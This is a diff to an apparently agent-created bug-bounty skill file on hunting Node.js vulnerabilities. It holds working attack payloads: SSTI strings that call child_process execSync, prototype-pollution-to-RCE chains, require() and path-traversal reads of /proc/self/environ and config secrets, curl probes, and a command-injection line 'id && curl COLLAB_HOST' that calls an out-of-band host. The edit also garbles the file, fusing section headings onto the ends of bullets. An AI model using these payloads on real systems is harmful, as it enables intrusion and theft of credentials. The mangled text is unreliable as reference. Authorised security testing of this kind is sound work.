@@ -4,14 +4,13 @@ description: "Hunt prototype pollution to RCE, trust-proxy abuse, eval/child_pro
 agent_created: true
 ---
 
-# Node.js-specific vulnerability hunting — unified skill
+# Node.js-specific vulnerability hunting — unified methodology
 
-> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.
+> **Methodology skill.** Merged from 2 upstream skills across cbh, hunting. Payloads, wordlists and supporting data are in `references/`.
 
-## Unified upstream methodology (complete, deduplicated)
+## Unified upstream methodology (deduplicated)
 
 ### Discovery and hunting method
-
 ### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for
 
 - **CVE-2026-111497 "Node2Shell" / HTTP2Shell (Oct 2026)** — out-of-bounds write (CWE-787) plus unchecked return value (CWE-252) in the Brotli decoder bundled with Node.js. Google CVSS v4.0 **9.2**. Fixed runtimes: **22.23.4 / 24.22.1 / 26.12.1**; Node 20.x and 25.x are EoL with **no fix**. Upstream Brotli 1.0.3–1.2.0, fixed in 1.0.10 / 1.1.1 / 1.2.1; Bun ≤ 1.4.3 (fixed 1.4.4). Debian/Ubuntu/RHEL/Alpine may ship a *system* Brotli, so the Node.js `-v` number alone does not prove patched status — check the distro Brotli package.
@@ -26,10 +25,7 @@ agent_created: true
 - **Node runtime inventory signals in JS bundles:** `__NEXT_DATA__` / webpack chunks may embed `process.version`, `process.versions.openssl`, or a hardcoded `NODE_OPTIONS`. Any `NODE_OPTIONS=--require`/`--inspect` string in a bundled config or `.env` is a separate high-severity finding.
 - **HTTP/2 surface:** confirm ALPN `h2` with `openssl s_client -alpn h2 -connect host:443`; HTTP/2 Rapid Reset (CVE-2023-44487) and Node's 2026 HTTP/2 UAF (CVE-2026-56848) both require the protocol to be negotiated. Test on the API host, not just the marketing host.
 - **Dependency version pinning:** `npm ls lodash body-parser express` (where source is available) or a source-map reconstruction should be recorded for every claim — the 2026 lodash advisories hinge on the exact resolved version (4.17.23 introduced one fix, 4.18.1 fixes the bypass).
-- **Suspicious runtime response shapes:** a body-parser 2.x stack mentioning `zlib` / `BrotliDecompress`, a `Received HTTP/2 stream error` log, or repeated worker restarts correlated with br-encoded requests are telemetry-grade indicators of Node2Shell probing even when your own PoC only produced a crash.
-
-### Signals and surfaces
-
+- **Suspicious runtime response shapes:** a body-parser 2.x stack mentioning `zlib` / `BrotliDecompress`, a `Received HTTP/2 stream error` log, or repeated worker restarts correlated with br-encoded requests are telemetry-grade indicators of Node2Shell probing even when your own PoC only produced a crash.### Signals and surfaces
 ### Crown Jewel Targets
 
 Prototype Pollution reaching a sink in Node.js backend = Critical RCE.
@@ -54,10 +50,7 @@ Error stack traces with .js paths  Node.js confirmed
 __proto__ in JSON accepted        Prototype pollution candidate
 ```
 
----
-
-### Techniques, payloads and bypasses
-
+---### Techniques and bypasses
 ### B. Techniques & bypasses — specific actionable techniques/payload shapes
 
 - **Node2Shell probe shape:** send a POST with `Content-Encoding: br` and a hand-crafted Brotli stream whose meta-block declares one block type then requests a block-type switch. Patched builds fail immediately with `BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH` (the new error constant from upstream commit `0ed4268a`); unpatched builds either crash or continue into the OOB write. Use a **unique per-test subdomain** on a Collaborator for the callback — crashes are easy to reproduce, confirmed code execution is not.
@@ -68,10 +61,7 @@ __proto__ in JSON accepted        Prototype pollution candidate
 - **Template engines:** EJS `<%= 7*7 %>` → 49, then `process.mainModule.require("child_process").execSync("id")`; Pug `- var x = root.process` then `x.mainModule.require(...)`; Handlebars prototype-pollution gadget via nested `#with`/`#each`. SSTI → OOB callback remains the cleanest proof.
 - **`require()` injection:** where a module path is user-controlled, `require("../package.json")`, `require("/proc/self/environ")`, or a `data:`/`node:` prefixed path can load server-local files as JS. Combine with a relative path traversal to reach `../../config/production.json` and dump secrets in the thrown stack trace.
 - **Body-parser depth:** JSON and `urlencoded` parsers have a `depth` option (default 32 in newer body-parser); deeply nested JSON can be used for parser-exhaustion DoS, and `__proto__` inside nested structures is the classic lodash/qs pollution carrier. Test both `{"a":{"b":...}}` nesting and `?a[b][__proto__][x]=1` query forms.
-- **Stack-trace oracle:** Node unhandled exceptions print absolute `.js` paths and module versions. Trigger one deliberately with a type-confusion input (`{"id": {"toString": 1}}`) and use the disclosed `node_modules/<pkg>/package.json` paths to pin exact dependency versions for CVE matching.
-
-### Validation and proof
-
+- **Stack-trace oracle:** Node unhandled exceptions print absolute `.js` paths and module versions. Trigger one deliberately with a type-confusion input (`{"id": {"toString": 1}}`) and use the disclosed `node_modules/<pkg>/package.json` paths to pin exact dependency versions for CVE matching.### Validation and proof
 ### Validation
 
 ✅ Prototype pollution: key appears in subsequent API responses without being sent
@@ -112,10 +102,7 @@ __proto__ in JSON accepted        Prototype pollution candidate
 - SSTI → RCE: Critical
 - child_process injection: Critical
 - Trust proxy → rate limit bypass: Medium
-- /proc/self/environ exfil: High (if cloud keys present)
-
-### Escalation and related chains
-
+- /proc/self/environ exfil: High (if cloud keys present)### Escalation and related chains
 ### Phase 3 — Prototype Pollution → RCE Chain
 
 ```bash
@@ -158,10 +145,7 @@ curl -s -X POST https://$TARGET/api/template \
 | child_process injection | `id && curl COLLAB_HOST` | Critical RCE |
 | /proc/self/environ via LFI | AWS_ACCESS_KEY_ID leaked | Cloud compromise |
 
----
-
-### Sources and related reading
-
+---### Sources and related reading
 ### D. Sources — numbered list of URLs you actually fetched
 
 1. https://www.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
@@ -174,10 +158,7 @@ curl -s -X POST https://$TARGET/api/template \
 8. https://semgrep.dev/blog/2026/patch-your-node-and-eat-your-brotli-or-you-wont-get-dessert/
 9. https://www.imperva.com/blog/node2shell-from-brotli-data-to-remote-code-execution/
 10. https://nodejs.org/en/blog/release/v24.22.1
-11. https://github.com/advisories/GHSA-fwxx-wv44-7qfg
-
-### Additional notes
-
+11. https://github.com/advisories/GHSA-fwxx-wv44-7qfg### Additional notes
 ### Phase 1 — Fingerprint
 
 ```bash
@@ -304,16 +285,8 @@ curl -s "https://$TARGET/api/file?path=/proc/self/cmdline"  # full command line
 curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 ```
 
----
+---## Probes
 
-## Source skills merged into this topic
+## Supporting data
 
-- `hunting` — `nodejs`
-- `cbh` — `hunt-nodejs`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `../../upstream/` — complete unmodified archives of all five source repositories
 - `bbhunt-methodology` — orchestrator, state machine and class router
